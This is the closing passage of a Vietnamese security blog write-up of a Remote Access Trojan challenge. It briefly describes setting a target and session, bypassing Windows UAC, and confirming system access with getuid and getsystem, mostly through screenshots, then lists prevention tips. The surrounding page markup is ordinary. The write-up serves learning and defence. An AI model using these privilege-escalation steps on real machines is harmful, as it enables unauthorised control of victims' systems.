+<p><img src="/p/remote-access-trojan-rat/image-18.png"
+	width="438"
+	height="140"
+	srcset="/p/remote-access-trojan-rat/image-18_huff8071f11b81f630c80d5b2a15eab808_17456_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-18_huff8071f11b81f630c80d5b2a15eab808_17456_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="750px"
+	
+></p>
+<p>Vậy thì đến đây chúng ta sẽ set target cũng như session</p>
+<p><img src="/p/remote-access-trojan-rat/image-19.png"
+	width="447"
+	height="75"
+	srcset="/p/remote-access-trojan-rat/image-19_hu956edb33b4e16caf82840defbe6034c7_15533_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-19_hu956edb33b4e16caf82840defbe6034c7_15533_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="596"
+		data-flex-basis="1430px"
+	
+></p>
+<p>Sau bước này chúng ta có thể run để bypass UAC</p>
+<p><img src="/p/remote-access-trojan-rat/image-20.png"
+	width="927"
+	height="307"
+	srcset="/p/remote-access-trojan-rat/image-20_hu6725a9a06c9bc92116f3c2d9d3f727cf_118260_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-20_hu6725a9a06c9bc92116f3c2d9d3f727cf_118260_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="724px"
+	
+></p>
+<p>Sau khi check <code>getuid</code> và <code>getsystem</code> đều đã ra những thứ chúng ta cần</p>
+<p><img src="/p/remote-access-trojan-rat/image-21.png"
+	width="522"
+	height="55"
+	srcset="/p/remote-access-trojan-rat/image-21_hua78b243194fa07b5758616ad6ba104af_25175_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-21_hua78b243194fa07b5758616ad6ba104af_25175_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="949"
+		data-flex-basis="2277px"
+	
+></p>
+<p><img src="/p/remote-access-trojan-rat/image-22.png"
+	width="1209"
+	height="70"
+	srcset="/p/remote-access-trojan-rat/image-22_hu9a326dcc9cd02f9705969838494fdd53_37167_480x0_resize_box_3.png 480w, /p/remote-access-trojan-rat/image-22_hu9a326dcc9cd02f9705969838494fdd53_37167_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1727"
+		data-flex-basis="4145px"
+	
+></p>
+<p>Vậy là đã thành công vượt qua được UAC và đã có quyền truy cập hệ thống</p>
+<p>&ndash;&gt; Hoàn thành challenge tìm hiểu và sử dụng RAT (Remote Access Trojan)</p>
+<h3 id="cách-phòng-tránh-rat-và-tự-bảo-vệ-chính-mình-trước-rat">Cách phòng tránh RAT và tự bảo vệ chính mình trước RAT</h3>
+<ul>
+<li>Không sử dụng các phần mềm Crack hoặc không download từ 1 nguồn không đáng tin cậy nào</li>
+<li>Không mở mail không xác định hoặc mở file đính kèm từ 1 mail không xác định</li>
+<li>Luôn cập nhật các bản vá hoặc phần mềm mới nhất từ trang chính thức của phần mềm đó (cũng như hệ điều hành)</li>
+<li>Thao tác các hành động không đáng tin cậy trên máy ảo</li>
+</ul>
+<h3 id="về-windows-đời-cao-hơn">Về Windows đời cao hơn</h3>
+<p>Đối với hệ điều hành Windows đời cao hơn, sẽ cần phải tắt tưởng lửa, window defender và tất nhiên cũng sẽ phải bypass UAC mới có thể sử dụng được và sự mô phỏng này có lẽ chưa thực sự khả thi với ngoài đời trong thời điểm hiện tại.</p>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/security/">Security</a>
+        
+            <a href="/tags/cve/">CVE</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed By Spid3r</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/ms17-010-cve-2017-0143/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ms17-010-cve-2017-0143/featured-image.6103050031f9b6d9caa9494f22d38194_hu69e7e51dfaf03e795a7783d1f5e83771_247169_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MS17-010 (CVE-2017-0143)"
+                        
+                        data-hash="md5-YQMFADH5ttnKqUlPItOBlA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MS17-010 (CVE-2017-0143)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo=""
+    data-repo-id=""
+    data-category=""
+    data-category-id=""
+    data-mapping="title"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="en"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('light');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 Spid3r&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
